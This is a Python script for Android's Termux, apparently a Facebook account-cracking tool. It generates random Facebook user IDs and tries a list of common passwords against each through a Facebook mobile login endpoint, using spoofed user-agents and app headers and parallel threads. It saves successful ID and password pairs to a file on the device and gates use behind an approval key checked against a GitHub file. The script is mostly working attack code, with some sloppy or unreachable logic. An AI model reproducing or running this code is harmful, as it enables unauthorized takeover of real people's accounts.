
#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import sys
import subprocess
import time, uuid
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import requests

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")


#---------[BAKI KA CODE YAHAN AAYEGA]------------------#
    
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool
#----------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#--------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
#----------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
x = (a+build+b).upper().replace(".","")
z = "X".join(x)
keys = z[15:]
final_key = "Rahim-" + keys

appx_buffer = BytesIO()
appx_curl = pycurl.Curl()
appx_curl.setopt(pycurl.URL, "https://pastebin.com/raw/gkD83bzg")
appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
appx_curl.perform()
appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
raw = "".join(appx_data)

#----------------------------[USER/AGENT]-----------------------------------#
import random

def Rahim_1(count=100):
    """
    Generate unique User-Agent strings (2009–2015 era).
    Includes Android.
    """
    android_versions = [
        '2.1','2.2.1','2.3.6','4.0.4','4.1.2',
        '4.2.2','4.3.1','4.4.2','5.0.1','5.1.1','6.0.1'
        ]
    android_models = [
        'GT-I9000','GT-I9100','GT-S5830','GT-N7000',
        'HTC Desire','Nexus One','Xperia X10i','LG-P500',
        'GT-N7100','SM-J500H','SM-G355H','SM-G610F',
        'SM-G900H','SM-G7102','MotoG2','Redmi Note 3'
    ]
    user_agents = set()  # unique store

    while len(user_agents) < count:
        ua_type = random.choice(['android','ios','desktop'])

        if ua_type == 'android':
            ua = (
                f'Dalvik/1.6.0 (Linux; U; Android {random.choice(android_versions)}; '
                f'{random.choice(android_models)} Build/{random.choice(["FRF91","GRJ90","IMM76D","JZO54K","KOT49H","LRX21V","MMB29K"])}) '
                f'[FBAN/FB4A;FBAV/{random.randint(10,120)}.0.0.{random.randint(1,40)}.{random.randint(10,400)};'
                f'FBPN/com.facebook.katana;FBLC/en_US;FBBV/{random.randint(1000000,1500000)};'
                f'FBCR/{random.choice(["Airtel","Vodafone","Jio","Idea","Telenor"])};'
                f'FBMF/{random.choice(["samsung","HTC","LGE","Sony","Xiaomi","Motorola"])};'
                f'FBBD/{random.choice(["samsung","HTC","LGE","Sony","Xiaomi","Motorola"])};'
                f'FBDV/{random.choice(android_models)};FBSV/{random.choice(android_versions)};'
                
            )

        user_agents.add(ua)

    return list(user_agents)
##========ua2=================
def Rahim_1():
    """
    Generates random Windows User-Agent strings (2009–2014 era).
    """
    # Chrome (2009–2014 builds → v5–39)
    chrome_ver = f"{random.randint(5, 39)}.0.{random.randint(200, 2000)}.{random.randint(0, 150)}"
    A = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1'])}; en-US) " \
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"

    # Firefox (2009–2014 → v3.5 – v34)
    ff_major = random.randint(3, 34)
    B = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.1'])}; rv:{ff_major}.0) " \
        f"Gecko/20100101 Firefox/{ff_major}.0"

    # Internet Explorer (IE8–IE11)
    ie_ver = random.choice(["8.0", "9.0", "10.0", "11.0"])
    trident_map = {"8.0": "4.0", "9.0": "5.0", "10.0": "6.0", "11.0": "7.0"}
    C = f"Mozilla/5.0 (compatible; MSIE {ie_ver}; Windows NT {random.choice(['5.1','6.1'])}; Trident/{trident_map[ie_ver]})"

    return random.choice([A, B, C])


def Rahim_2():
    """
    Generates random Android User-Agent strings (2010–2014 era).
    """
    android_ver = random.choice(["2.3.6","4.0.4","4.1.2","4.2.2","4.3","4.4.2"])
    devices = [
        "GT-I9100", "GT-I9300", "GT-N7100", "Nexus 4", "Nexus 5", 
        "HTC One X", "LG-P990", "Sony Xperia Z", "Micromax A110"
    ]
    device = random.choice(devices)
    chrome_ver = f"{random.randint(18, 39)}.0.{random.randint(800, 2000)}.{random.randint(0, 150)}"
    A = f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) " \
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    return A


def Rahim_3():
    """
    Generates random iOS User-Agent strings (2010–2014 era).
    """
    ios_ver = random.choice(["4_3_5","5_1_1","6_1_6","7_1_2"])
    devices = ["iPhone", "iPad", "iPod touch"]
    device = random.choice(devices)

    # Safari builds (2009–2014)
    safari_map = {
        "4_3_5": ("533.17.9","5.0"),
        "5_1_1": ("534.46","5.1"),
        "6_1_6": ("536.26","6.0"),
        "7_1_2": ("537.51.2","7.0"),
    }
    safari_ver, version_str = safari_map[ios_ver]

    A = f"Mozilla/5.0 ({device}; CPU {device} OS {ios_ver} like Mac OS X) " \
        f"AppleWebKit/{safari_ver} (KHTML, like Gecko) Version/{version_str} Mobile/10A5376e Safari/{safari_ver}"

    return A


def Rahim_all():
    """
    Returns a random UA from Windows, Android, or iOS (2009–2014 pools).
    """
    return random.choice([Rahim_1(), Rahim_2(), Rahim_3()])
    
    #-------------------[ DATE-CHECKER ]-----------------#
def Rahimx(fx):
    if len(fx) == 20:
        if fx[:10] in ['1000000000']:
            Rahimxz = '2013/2014'
            return Rahimxz
        if fx[:9] in ['100000000']:
            Rahimxz = '2013/2014'
            return Rahimxz
        if fx[:8] in ['10000000', '10000001', '10000002', '10000003', '10000004', '10000005']:
            Rahimxz = '2014'
            return Rahimxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            Rahimxz = '2013'
            return Rahimxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            Rahimxz = '2014/2015'
            return Rahimxz
        if fx[:6] in ['100001']:
            Rahimxz = '2014/2015'
            return Rahimxz
        if fx[:6] in ['100002', '100003']:
            Rahimxz = '2014/2015'
            return Rahimxz
        if fx[:6] in ['100004']:
            Rahimxz = '2014/2015'
            return Rahimxz
        if fx[:6] in ['100004']:
            Rahimxz = '2012/2013'
            return Rahimxz
        if fx[:6] in ['100004']:
            Rahimxz = '2012/2013'
            return Rahimxz
        if fx[:6] in ['100005', '100006']:
            Rahimxz = '2013/2014'
            return Rahimxz
        if fx[:6] in ['100007', '100008']:
            Rahimxz = '2014/2015'
            return Rahimxz
        if fx[:6] in ['100009']:
            Rahimxz = '2012'
            return Rahimxz
        if fx[:5] in ['10001']:
            Rahimxz = '2013'
            return Rahimxz
        if fx[:5] in ['10002']:
            Rahimxz = '2014'
            return Rahimxz
        if fx[:5] in ['10003']:
            Rahimxz = '2013'
        if fx[:5] in ['10004']:
            Rahimxz = '2013'
            return Rahimxz
        if fx[:5] in ['10005']:
            Rahimxz = '2012'
            return Rahimxz
        if fx[:5] in ['10006', '10007', '10008']:
            Rahimxz = '2014/2015'
            return Rahimxz
        Rahimxz = '2012'
        return Rahimxz
        if fx[:5] in ['10004']:
            Rahimxz = '2013/2014'
            return Rahimxz
        if fx[:5] in ['10005']:
            Rahimxz = '2012'
            return Rahimxz
        if fx[:5] in ['10006', '10007', '10008']:
            Rahimxz = '2011/2012'
            return Rahimxz
        Rahimxz = '2012'
        return Rahimxz
    if len(fx) in [11, 12]:
        Rahimxz = '2011/2012'
        return Rahimxz
    if len(fx) == 14:
        Rahimxz = '2014'
        return Rahimxz
    if len(fx) == 15:
        Rahimxz = '2015'
        return Rahimxz
    Rahimxz = '2014/2015'
    return Rahimxz
#-_-_-_-_-_-_-_-<-LOGO->-_-_-_-_-_-_-_-#
from datetime import datetime

# Get current date & time
now = datetime.now()
formatted_date = now.strftime("%d/%B/%Y")
formatted_time = now.strftime("%I:%M:%S %p")
os.system('clear');os.system('welcome,to, AR, Rahim , King , Server, thanks"')
os.system('pkg update')

logo = (f"""
\x1b[1;92m▶  ┈••✦ لآ اِلَهَ اِلّا اللّهُ مُحَمَّدٌ رَسُوُل اللّهِ ✦••┈☪︎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠶⢦⣤⠶⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠁⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⣄⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠉⠛⠃⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠉⠙⢳⣄⢀⡾⠁⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠙⢿⡇⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠹⣦⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠋⠛⢧⡀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠾⣧⡀⠀⠀⠹⣦⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⡟⠉⠛⢷⣄⠀⠀⠈⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 \x1b[1;44mAUTHOR   : AR Rahim King 🌝
  \x1b[1;44mGITHUB   : Rahim2034/Rahim-King
  \x1b[1;44mBESTU    : Rotna,Bithi      
  \x1b[1;44mVERSION  : 22.7.0
  \x1b[1;92mDATE     : {formatted_date}
  \x1b[1;92mTIME     : {formatted_time}
  \x1b[1;92mKam Kore ki korben,termux Chalan Inkam koren
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}✍️{r}/{g}{w} EXAMPLE   {r}: {w}1000 {g}| {w}2000 {g}| {w}9000')
    lin()
    limit = input(f"{g}🥕{r}/{g}{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
    lin()
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}1{r}]")
    lin()
    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
    lin()
    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    if "1" in cspd:
        speedx = 50
    else:
        speedx = 35
        
    if ask in ["1"]:
        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
        star = "10000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        sv = f"{g}[{w}2009{r}-{w}2010{g}]"
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=speedx) as samira:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = star + mal
            if mtd_opt in ["1", "A"]:
                samira.submit(login, uid, tl)
            elif mtd_opt in ["2", "B"]:
                samira.submit(login1, uid, tl)
            else:
                samira.submit(login, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()
#----------------------------[METHOD 1]-----------------------------------#
def login(uid, tl):
    global oks, loop
    try:
        ua_list = Rahim_all()
        sys.stdout.write(f"\r➤ {g}Rahim{r}-{g}Rahim {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
             chosen_ua = Rahim_all()
             headers = {
             "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
             "Content-Type": "application/x-www-form-urlencoded",
             "Host": "graph.facebook.com",
             "X-FB-Net-HNI": "47001",
             "X-FB-SIM-HNI": "47001",
             "X-FB-Connection-Type": "MOBILE.LTE",
             "X-Tigon-Is-Retry": "False",
             "x-fb-session-id": "nid=27Y5JlHQUYfw;pid=Main;tid=751;",
             "x-fb-device-group": "5120",
             "X-FB-Friendly-Name": "ViewerReactionsMutation",
             "X-FB-Request-Analytics-Tags": "graphservice",
             "X-FB-HTTP-Engine": "Liger",
             "X-FB-Client-IP": "True",
             "X-FB-Server-Cluster": "True",
             "x-fb-connection-token": "3d86a6aea98013a526930c84c9b7cd0d"
         }
             url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
             rp = requests.get(url, headers=headers).json()
             if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
             elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/Rahim-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
             else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass

#----------------------------[APPROVAL]-----------------------------------#
#----------------------------[APPROVAL SYSTEM - GITHUB]-----------------------------------#
def approval():
    global final_key
    try:
        response = requests.get("https://github.com/rahim2034/Rahim-King/blob/main/Rahim.Txt")
        if final_key in response.text:
            os.system("clear")
            print(logo)
            print(f"{g}[{r}~{g}] {w}YOUR KEY '{final_key}' IS APPROVED")
            lin()
            time.sleep(2)
            main()
        else:
            os.system("clear")
            print(logo)
            print(f"{r}[!] YOUR KEY '{final_key}' IS NOT APPROVED")
            print(f"{g}[!] PLEASE CONTACT ADMIN FOR APPROVAL")
            lin()
            input(f"{g}[{r}~{g}] COPY KEY AND PRESS ENTER TO OPEN WHATSAPP ")
            os.system('xdg-open https://t.me/rahimking2034')
            sys.exit()
    except Exception as e:
        print(f"{r}[ERROR] CHECK INTERNET OR GITHUB LINK!")
        sys.exit()
print(f"\n{g}Your device key: {final_key}\nSend this key to admin for approval.\n")
time.sleep(2)
approval()        

#----------------------------[CODE/END]-----------------------------------#
        
